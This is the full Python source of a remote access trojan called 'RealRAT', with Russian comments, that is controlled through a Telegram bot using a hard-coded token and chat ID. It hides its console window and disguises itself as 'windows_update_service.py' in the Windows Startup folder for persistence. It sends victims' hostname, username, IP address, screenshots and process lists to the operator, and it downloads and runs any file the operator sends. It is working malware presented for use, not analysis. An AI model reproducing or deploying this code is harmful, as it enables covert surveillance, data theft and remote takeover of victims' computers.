import os
import platform
import requests
import subprocess
import time
import shutil
import socket
import sys
import json

try:
    from PIL import ImageGrab
except ImportError:
    if platform.system().startswith("Windows"):
        os.system("python -m pip install pillow -q -q -q")
        from PIL import ImageGrab
    elif platform.system().startswith("Linux"):
        os.system("python3 -m pip install pillow -q -q -q")
        from PIL import ImageGrab

BOT_TOKEN = "8317387634:AAHexPFi5rjtIZMDztq2oOnPp9z8Chl4sn0"
CHAT_ID = "-1003442349627"

selected_pc = None
victims = {}

class RealRAT:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.chat_id = CHAT_ID
        self.victim_id = socket.gethostname()
        self.last_update_id = 0
        
        victims[self.victim_id] = {
            'username': os.getlogin(),
            'online': True,
            'last_seen': time.time()
        }
        
    def hide_console(self):
        try:
            if platform.system().startswith("Windows"):
                import win32gui
                import win32con
                window = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(window, win32con.SW_HIDE)
        except:
            pass

    def setup_persistence(self):
        try:
            if platform.system().startswith("Windows"):
                appdata = os.getenv('APPDATA')
                startup_dir = os.path.join(appdata, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                
                script_path = os.path.abspath(__file__)
                target_path = os.path.join(startup_dir, 'windows_update_service.py')
                
                if not os.path.exists(target_path):
                    shutil.copy2(script_path, target_path)
                    subprocess.run(f'attrib +h +s "{target_path}"', shell=True, capture_output=True)
                    
        except:
            pass

    def send_to_telegram(self, text):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            params = {
                'chat_id': self.chat_id,
                'text': text
            }
            requests.get(url, params=params, timeout=5)
        except:
            pass

    def send_file_to_telegram(self, filename):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            with open(filename, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': self.chat_id}
                requests.post(url, data=data, files=files, timeout=5)
        except:
            pass

    def download_file(self, file_id, filename):
        """Скачивает файл из Telegram"""
        try:
            # Получаем информацию о файле
            url = f"https://api.telegram.org/bot{self.bot_token}/getFile"
            params = {'file_id': file_id}
            response = requests.get(url, params=params, timeout=10)
            
            if response.status_code == 200:
                file_info = response.json()
                file_path = file_info['result']['file_path']
                
                # Скачиваем файл
                download_url = f"https://api.telegram.org/file/bot{self.bot_token}/{file_path}"
                file_response = requests.get(download_url, timeout=30)
                
                if file_response.status_code == 200:
                    # Сохраняем файл
                    with open(filename, 'wb') as f:
                        f.write(file_response.content)
                    return True
                    
        except Exception as e:
            print(f"Ошибка скачивания: {e}")
        return False

    def send_main_keyboard(self):
        """Основная клавиатура управления"""
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            keyboard = {
                'keyboard': [
                    [{'text': '📸 Скриншот'}, {'text': '💻 Информация'}],
                    [{'text': '🌐 IP адрес'}, {'text': '📊 Процессы'}],
                    [{'text': '🔄 Перезагрузить'}, {'text': '🗑️ Удалить RAT'}],
                    [{'text': '🖥️ Сменить ПК'}, {'text': '📁 Запуск файлов'}]
                ],
                'resize_keyboard': True
            }
            
            global selected_pc
            current_pc = selected_pc if selected_pc else self.victim_id
            
            params = {
                'chat_id': self.chat_id,
                'text': f'🎯 Управление: {current_pc}\nВыберите действие:',
                'reply_markup': keyboard
            }
            requests.post(url, json=params, timeout=5)
        except:
            pass

    def send_pc_selection_keyboard(self):
        """Клавиатура выбора ПК"""
        try:
            victims[self.victim_id]['online'] = True
            victims[self.victim_id]['last_seen'] = time.time()
            
            pc_buttons = []
            for pc_id, pc_info in victims.items():
                status = "🟢" if pc_info['online'] else "🔴"
                button_text = f"{status} {pc_id}"
                pc_buttons.append([{'text': button_text}])
            
            pc_buttons.append([{'text': '⬅️ Назад'}])
            
            keyboard = {
                'keyboard': pc_buttons,
                'resize_keyboard': True
            }
            
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            params = {
                'chat_id': self.chat_id,
                'text': '🖥️ Выберите компьютер:',
                'reply_markup': keyboard
            }
            requests.post(url, json=params, timeout=5)
        except:
            pass

    def collect_system_info(self):
        try:
            ip = requests.get('https://ifconfig.me/ip', timeout=5).text.strip()
            
            info = f"""💻 СИСТЕМА:

🖥️ Компьютер: {self.victim_id}
👤 Пользователь: {os.getlogin()}
🌐 IP: {ip}
⚙️ ОС: {platform.system()} {platform.release()}"""
            
            return info
        except:
            return f"💻 Компьютер: {self.victim_id}\n👤 Пользователь: {os.getlogin()}"

    def take_screenshot(self):
        try:
            file_path = "screen.png"
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            self.send_file_to_telegram(file_path)
            os.remove(file_path)
            return True
        except:
            return False

    def get_processes(self):
        try:
            if platform.system().startswith("Windows"):
                result = subprocess.check_output('tasklist', shell=True, stderr=subprocess.STDOUT)
            else:
                result = subprocess.check_output('ps aux', shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8', errors='ignore').strip()[:3000]
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"

    def uninstall_rat(self):
        try:
            if platform.system().startswith("Windows"):
                startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                rat_path = os.path.join(startup_dir, 'windows_update_service.py')
                if os.path.exists(rat_path):
                    os.remove(rat_path)
            
            if self.victim_id in victims:
                del victims[self.victim_id]
                
            return True
        except:
            return False

    def launch_file(self, file_path):
        """Запускает любой файл"""
        try:
            if os.path.exists(file_path):
                # Для EXE файлов
                if file_path.lower().endswith('.exe'):
                    subprocess.Popen(f'"{file_path}"', shell=True)
                # Для других файлов (открывает программой по умолчанию)
                else:
                    os.startfile(file_path) if platform.system().startswith("Windows") else subprocess.Popen(['xdg-open', file_path])
                
                return f"✅ Запущено: {os.path.basename(file_path)}"
            else:
                return "❌ Файл не найден"
                
        except Exception as e:
            return f"❌ Ошибка запуска: {str(e)}"

    def execute_command(self, command):
        try:
            if command == '📸 Скриншот':
                self.take_screenshot()
                return "📸 Скриншот отправлен!"
                
            elif command == '💻 Информация':
                return self.collect_system_info()
                
            elif command == '🌐 IP адрес':
                ip = requests.get('https://ifconfig.me/ip', timeout=5).text.strip()
                return f"🌐 IP: {ip}"
                
            elif command == '📊 Процессы':
                processes = self.get_processes()
                return f"📊 Процессы:\n{processes}"
                
            elif command == '🔄 Перезагрузить':
                if platform.system().startswith("Windows"):
                    os.system('shutdown /r /t 5')
                    return "🔄 Перезагрузка через 5 секунд!"
                else:
                    os.system('shutdown -r now')
                    return "🔄 Перезагрузка!"
                    
            elif command == '🗑️ Удалить RAT':
                if self.uninstall_rat():
                    return "🗑️ RAT удалена!"
                else:
                    return "❌ Ошибка удаления"
                    
            else:
                return "❌ Неизвестная команда"
                
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"

    def check_commands(self):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
            params = {'offset': self.last_update_id + 1}
            response = requests.get(url, params=params, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                if 'result' in data:
                    for update in data['result']:
                        update_id = update['update_id']
                        
                        if update_id > self.last_update_id:
                            self.last_update_id = update_id
                        
                        if 'message' in update:
                            message = update['message']
                            
                            # Обработка ТЕКСТОВЫХ команд
                            if 'text' in message:
                                message_text = message['text']
                                
                                # Команда смены ПК
                                if message_text in ['/change', '🖥️ Сменить ПК']:
                                    self.send_pc_selection_keyboard()
                                    continue
                                
                                # Кнопка Назад
                                if message_text == '⬅️ Назад':
                                    self.send_main_keyboard()
                                    continue
                                
                                # Выбор ПК
                                if message_text.startswith('🟢 ') or message_text.startswith('🔴 '):
                                    selected_pc_name = message_text[2:]
                                    if selected_pc_name in victims:
                                        global selected_pc
                                        selected_pc = selected_pc_name
                                        self.send_to_telegram(f"🎯 Выбран: {selected_pc}")
                                        self.send_main_keyboard()
                                    continue
                                
                                # Основные команды (только если выбран этот ПК или не выбран никто)
                                global selected_pc
                                if selected_pc is None or selected_pc == self.victim_id:
                                    if message_text in ['📸 Скриншот', '💻 Информация', '🌐 IP адрес', '📊 Процессы', 
                                                      '🔄 Перезагрузить', '🗑️ Удалить RAT', '📁 Запуск файлов']:
                                        
                                        if message_text == '📁 Запуск файлов':
                                            self.send_to_telegram("📁 Кинь мне любой файл (exe, txt, jpg, etc) - я его скачаю и запущу!")
                                            continue
                                        
                                        result = self.execute_command(message_text)
                                        self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
                                        
                                        if message_text == '🗑️ Удалить RAT':
                                            sys.exit(0)
                            
                            # Обработка ФАЙЛОВ
                            elif 'document' in message:
                                global selected_pc
                                if selected_pc is None or selected_pc == self.victim_id:
                                    document = message['document']
                                    file_id = document['file_id']
                                    file_name = document.get('file_name', 'downloaded_file')
                                    
                                    self.send_to_telegram(f"📥 Скачиваю файл: {file_name}")
                                    
                                    # Скачиваем файл
                                    if self.download_file(file_id, file_name):
                                        # Запускаем файл
                                        result = self.launch_file(file_name)
                                        self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
                                    else:
                                        self.send_to_telegram(f"💻 {self.victim_id}:\n❌ Ошибка скачивания файла")
                            
        except Exception as e:
            print(f"Ошибка проверки команд: {e}")

    def start(self):
        self.hide_console()
        self.setup_persistence()
        
        # Мгновенная отправка при запуске
        system_info = self.collect_system_info()
        self.send_to_telegram(system_info)
        self.send_main_keyboard()
        
        # Быстрый цикл
        while True:
            try:
                self.check_commands()
                time.sleep(1)
            except:
                time.sleep(2)

if __name__ == '__main__':
    rat = RealRAT()
    rat.start()
